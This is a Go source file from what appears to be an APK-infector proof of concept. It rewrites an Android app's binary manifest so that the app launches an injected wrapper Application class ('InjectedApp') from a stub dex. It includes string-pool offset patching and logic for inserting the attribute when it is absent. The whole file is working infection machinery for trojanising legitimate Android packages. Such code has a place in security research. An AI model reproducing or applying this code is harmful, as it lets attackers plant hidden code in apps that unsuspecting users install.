package manifest

import (
	"bytes"
	"encoding/binary"
	"encoding/xml"
	"github.com/thatskriptkid/apk-infector-Archinome-PoC/internal/utils"
	"golang.org/x/text/encoding/unicode"
	"log"
	"os"
	"path/filepath"
)

const (
	fileLenOffset             = 0x4
	offsetTableOffset         = 0x24
	offsetStringTableLen      = 0xc
	stringTableInfoSizeOffset = 0x1c

	// Name of application in our stub dex
	// It is MUST be longer than any average name
	newAppNameUTF8    = "aaaaaaaa.aaaaaaaaaaaaaaaaaaaa.aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.aaaaaaaaaaaaaaaaaaaaaa.InjectedApp"
	newAppNameUTF8Len = uint8(len(newAppNameUTF8))
)

var alignCount uint32
var oldAppNameUTF16 string
var newAppNameUTF16 string
var OldAppNameUTF8 string

// WrapperClassName returns the class name the patched manifest points
// android:name at — the injected Application wrapper from InjectedApp.dex.
func WrapperClassName() string { return newAppNameUTF8 }

// HostAppClassName returns the fully-qualified name of the host's own
// Application class. The wrapper extends it, so the dex patch has to rename the
// stub's placeholder base class to exactly this name: an android:name written
// relative (".MyApp") must be resolved against the manifest package, otherwise
// the renamed base class does not exist and ART cannot load the wrapper.
// manifestAppAdded is set when the host manifest had no <application
// android:name> and the wrapper reference was appended by the ADD path. In that
// case there is no host Application class to subclass, so the wrapper extends
// the framework android.app.Application instead.
var manifestAppAdded bool

func HostAppClassName() string {
	if manifestAppAdded {
		return "android.app.Application"
	}
	if OldAppNameUTF8 == "" {
		return ""
	}
	pkg := getPackageName()
	if pkg == "" {
		return OldAppNameUTF8
	}
	return resolveClassName(pkg, OldAppNameUTF8)
}

var PlainPath, _ = filepath.Abs("AndroidManifest_plaintext.xml")

func patchApplication() ([]byte, int, bool) {

	log.Printf("Getting original application name...")
	OldAppNameUTF8 = getAppName()
	log.Printf("Original applciation name = %s\n", OldAppNameUTF8)

	if OldAppNameUTF8 == "" {
		// The host has no <application android:name>: there is no host
		// Application class for the wrapper to subclass, so the wrapper
		// extends android.app.Application and we add android:name pointing
		// at the wrapper itself.
		log.Printf("Application name wasn't found -> ADD path (android:name=%s)", newAppNameUTF8)
		manifestAppAdded = true
		return addApplicationName(), 0, true
	}

	// read bytes from binary xml
	androidManifestRaw, err := os.ReadFile(utils.ManifestBinaryPath)
	if err != nil {
		log.Panicf("Failed to read %s", utils.ManifestBinaryPath)
	}

	log.Printf("Original manifest (binary) size = 0x%0x\n", len(androidManifestRaw))

	// encode name to UTF-16
	encoder := unicode.UTF16(unicode.LittleEndian, unicode.IgnoreBOM).NewEncoder()
	oldAppNameUTF16, err = encoder.String(OldAppNameUTF8)

	// searching application name position in binary manifest
	pos := bytes.Index(androidManifestRaw, []byte(oldAppNameUTF16))

	//get lenght of string
	originalLen := int(androidManifestRaw[pos-2]) * 2

	log.Printf("pos = 0x%0x, original applciation name length = 0x%0x\n", pos, originalLen)

	//patch length with new value. length = characters count
	// pos-2 - because every string is followed by len
	androidManifestRaw[pos-2] = newAppNameUTF8Len

	//patch application name with new name
	// do not forget about alignment!
	newAppNameUTF16, err = encoder.String(newAppNameUTF8)
	newAppNameUTF16Len := len(newAppNameUTF16)

	// how many bytes we add to manifest
	lenDiff := newAppNameUTF16Len - originalLen

	//// we need enough space to insert our name
	androidManifestRawNew := make([]byte, len(androidManifestRaw)+newAppNameUTF16Len-originalLen)

	log.Printf("new applciation name = %s, new application length = 0x%0x\n",
		newAppNameUTF8, newAppNameUTF16Len)

	// copy everything until application name string
	copy(androidManifestRawNew, androidManifestRaw[:pos])

	// copy our name
	copy(androidManifestRawNew[pos:], []byte(newAppNameUTF16))

	// copy everything after name
	copy(androidManifestRawNew[pos+len([]byte(newAppNameUTF16)):], androidManifestRaw[pos+originalLen:])

	// calc position where we should insert alignment bytes
	alignPos := (newAppNameUTF16Len - originalLen) + StringTableEndPos

	log.Printf("alignPos = 0x%0x\n", alignPos)

	// how many bytes we should insert?
	// The main idea - data after string table should be
	// aligned to 4 bytes
	alignCount = uint32(alignPos % 4)

	log.Printf("align = %d\n", alignCount)

	if alignCount != 0 {
		var alignSlice = make([]byte, alignCount)

		// insert byte alignment
		androidManifestRawNew = append(androidManifestRawNew[:alignPos], append(alignSlice, androidManifestRawNew[alignPos:]...)...)

	}

	return androidManifestRawNew, lenDiff, false
}

// attrInsertOffset returns the offset inside the attribute list of the element
// starting at elemStart where an attribute with name index nameStrIdx has to be
// written.
//
// aapt2 emits an element's attributes sorted by ascending name index, and the
// framework resolves an attribute through the resource map keyed by that index.
// Appending a fresh attribute at the end of the list therefore only works when
// its name index is larger than every existing one: an android:name (index 3,
// right after android:icon/label) tacked on after android:icon..roundIcon is
// dropped silently - PackageManagerService then reports a null Application
// class, the host runs with android.app.Application and the injected wrapper
// never executes.
func attrInsertOffset(data []byte, elemStart, attrCount, nameStrIdx int) int {
	attrStart := int(leU16(data, elemStart+24))
	attrSize := int(leU16(data, elemStart+26))
	if attrSize == 0 {
		attrSize = 20
	}
	base := elemStart + 16 + attrStart
	for i := 0; i < attrCount; i++ {
		if int(leU32(data, base+i*attrSize+4)) > nameStrIdx {
			return base + i*attrSize
		}
	}
	return base + attrCount*attrSize
}

// addApplicationName adds android:name (0x01010003) to the <application>
// element, pointing at the wrapper class. Modeled on the "attribute ABSENT"
// branch of PatchAppComponentFactory: grow the string pool with the class
// string, grow the element by one 20-byte attribute (size +20 at +4, attrCount
// +1 at +28, the attribute spliced in at the position that keeps the list
// sorted by name index) and fix the AXML total size. No new attribute names are
// invented: 0x01010003 ("name") is already in every resource map.
func addApplicationName() []byte {
	data, err := os.ReadFile(utils.ManifestBinaryPath)
	if err != nil {
		log.Panicf("Failed to read %s: %v", utils.ManifestBinaryPath, err)
	}

	pool := parseStringPool(data)
	androidNs := pool.indexOf(data, androidNamespaceURI)
	if androidNs < 0 {
		log.Panic("android namespace URI not found in string pool")
	}
	resIds, resMapOff, resMapSizeOrig := readResMap(data)
	_ = resMapOff
	_ = resMapSizeOrig

	root := firstTagStart(data)
	if root < 0 {
		log.Panic("no <manifest> root tag found")
	}
	appStart := -1
	for _, c := range childElements(data, root) {
		if elementName(pool, data, c) == "application" {
			appStart = c.startOff
			break
		}
	}
	if appStart < 0 {
		log.Panic("<application> not found")
	}

	nameStrIdx := indexOfU32(resIds, resIDName)
	if nameStrIdx < 0 {
		log.Panic("'name' attribute resource id (0x01010003) not found in resource map")
	}

	// Append the wrapper class descriptor to the string pool.
	classStrIdx := uint32(pool.stringCount)
	oldDataSize := pool.size - pool.stringsStart
	acc := oldDataSize
	var newOffsetBytes, newStringBytes []byte
	enc := encodeString(pool.flags, newAppNameUTF8)
	newOffsetBytes = append(newOffsetBytes, u32bytes(uint32(acc))...)
	newStringBytes = append(newStringBytes, enc...)
	acc += len(enc)

	newStringCount := pool.stringCount + 1
	newStringsStart := pool.stringsStart + 4
	newPoolSize := pool.size + len(newOffsetBytes) + len(newStringBytes)
	if pad := (4 - newPoolSize%4) % 4; pad != 0 {
		newStringBytes = append(newStringBytes, make([]byte, pad)...)
		newPoolSize += pad
	}
	newTotal := len(data) + (newPoolSize - pool.size)

	edits := []axEdit{
		{pool.off + 4, u32bytes(uint32(newPoolSize)), true},
		{pool.off + 8, u32bytes(uint32(newStringCount)), true},
		{pool.off + 20, u32bytes(uint32(newStringsStart)), true},
		{pool.off + 28 + pool.stringCount*4, newOffsetBytes, false},
		{pool.off + pool.size, newStringBytes, false},
	}

	attrBytes := make([]byte, 20)
	putAttr(attrBytes, 0, uint32(androidNs), uint32(nameStrIdx), classStrIdx, 0x03, classStrIdx)
	appSize := int(leU32(data, appStart+4))
	appAttrCount := int(leU16(data, appStart+28))
	newTotal += 20
	insOff := attrInsertOffset(data, appStart, appAttrCount, int(nameStrIdx))
	edits = append(edits,
		axEdit{appStart + 4, u32bytes(uint32(appSize + 20)), true},
		axEdit{appStart + 28, u16bytes(uint16(appAttrCount + 1)), true},
		axEdit{insOff, attrBytes, false},
	)

	edits = append(edits, axEdit{axmlSizeOff, u32bytes(uint32(newTotal)), true})
	out := applyEdits(data, newTotal, edits)
	log.Printf("ADD android:name=%s into <application> (%d -> %d bytes)", newAppNameUTF8, len(data), len(out))
	return out
}

// we should find from what offset in StringOffsets
// we should start changing offsets by incrementing them to
// number of characters application name expanded
// manifest_strings.dmp contains all strings
// we should count strings after application name
// it will be position of offset

func getAppNameOffset() uint32 {

	// position in string offset
	//var appNameOff uint32 = 1
	var pos uint32

	data, err := os.ReadFile(ManifestStringsDmp)
	if err != nil {
		panic(err)
	}

	// searching application name position in string dump
	// we substract 2 because real offset is the offset to strLen + str
	// but we found offset to just str
	pos = uint32(bytes.Index(data, []byte(oldAppNameUTF16)) - 2)

	log.Printf("application name position in string dump = 0x%x", pos)

	return pos
}

func patchOffsetTable(data []byte, appNameOff, lenDiff uint32) {

	var offset uint32

	offsetTableReader := bytes.NewReader(data)

	var j uint32 = 0
	for i := uint32(1); i <= StringCnt-appNameOff; i++ {

		//read offset
		err := binary.Read(offsetTableReader, binary.LittleEndian, &offset)
		if err != nil {
			log.Panic("Failed to read offset", err)
		}

		log.Printf("Original offset = 0x%x", offset)

		//increment it to length of symbol added
		offset += lenDiff

		log.Printf("New offset = 0x%x", offset)

		binary.LittleEndian.PutUint32(data[j:], offset)
		j += 4
	}
}

func patchStringTableLen(data []byte) {

	var stringTableLen uint32

	stringTableLenReader := bytes.NewReader(data)

	err := binary.Read(stringTableLenReader, binary.LittleEndian, &stringTableLen)
	if err != nil {
		log.Panic("Failed to read offset", err)
	}

	// calc how many bytes we added to manifest
	// it's a difference between new name and old name
	// *2 - because they are in UTF-16
	// IMPORTANT! stringTableLen - must be 4 byte aligned
	newLen := len(newAppNameUTF16)
	oldLen := len(oldAppNameUTF16)
	stringTableLenNew := uint32(int(stringTableLen) + newLen - oldLen)

	// align
	stringTableLenNew += alignCount

	binary.LittleEndian.PutUint32(data, stringTableLenNew)
}

func Patch() {

	var androidManifestRaw, lenDiff, added = patchApplication()

	if added {
		// ADD path: no existing string moved, so the offset table and the
		// string-table length are already correct. addApplicationName wrote
		// the finished image.
		utils.WriteChanges(androidManifestRaw, utils.ManifestBinaryPath)
		return
	}

	log.Printf("New manifest len = 0x%0x\n", len(androidManifestRaw))

	// after we insert new application name we need to increase length of manifest len
	binary.LittleEndian.PutUint32(androidManifestRaw[fileLenOffset:], uint32(len(androidManifestRaw)))

	var appNameOff = getAppNameOffset()

	// search offset in manifest
	appNameOffArr := make([]byte, 4)
	binary.LittleEndian.PutUint32(appNameOffArr, appNameOff)

	pos := uint32(bytes.Index(androidManifestRaw, appNameOffArr))

	log.Printf("application name offset in manifest = 0x%x", pos)

	// we step to next offset after our found app name offset
	pos += 4

	// locate the end of stringTableOffset (equals to the start of strings)
	var stringTableInfoSize uint32
	var stringOffsetTableEnd uint32

	stringTableInfoSizeReader := bytes.NewReader(androidManifestRaw[stringTableInfoSizeOffset:])

	err := binary.Read(stringTableInfoSizeReader, binary.LittleEndian, &stringTableInfoSize)
	if err != nil {
		log.Panic("Failed to read offset", err)
	}

	log.Printf("stringTableInfoSize = 0x%x", stringTableInfoSize)

	// 0x8 - start of StringTableInfo section
	stringOffsetTableEnd = 0x8 + stringTableInfoSize

	log.Printf("stringOffsetTableEnd = 0x%x", stringOffsetTableEnd)

	//start reading & patching
	offsetTableReader := bytes.NewReader(androidManifestRaw[pos:])

	var j = pos
	var offset uint32
	for i := pos; i < stringOffsetTableEnd; {

		//read offset
		err := binary.Read(offsetTableReader, binary.LittleEndian, &offset)
		if err != nil {
			log.Panic("Failed to read offset", err)
		}

		//log.Printf("Original offset = 0x%x", offset)

		//increment it to length of symbol added
		offset += uint32(lenDiff)

		//log.Printf("New offset = 0x%x", offset)

		//patch with new value
		binary.LittleEndian.PutUint32(androidManifestRaw[j:], offset)
		j += 4
		i += 4
	}

	patchStringTableLen(androidManifestRaw[offsetStringTableLen:])

	utils.WriteChanges(androidManifestRaw, utils.ManifestBinaryPath)
}

// Search application name in decoded android manifest
func getAppName() string {

	// read manifest to byte array
	content, err := os.ReadFile(PlainPath)
	if err != nil {
		panic(err)
	}

	//defer func() {
	//	err = os.Remove(manifestPlainPath)
	//
	//	if err != nil {
	//		panic(err)
	//	}
	//} ()

	// structs for XML nodes
	type Application struct {
		Name string `xml:"name,attr"`
	}

	type Result struct {
		XMLName     xml.Name    `xml:"manifest"`
		Application Application `xml:"application"`
	}

	v := new(Result)

	err = xml.Unmarshal(content, v)
	if err != nil {
		log.Panic("Failed to unmarshal XML", err)
		return ""
	}

	return v.Application.Name
}
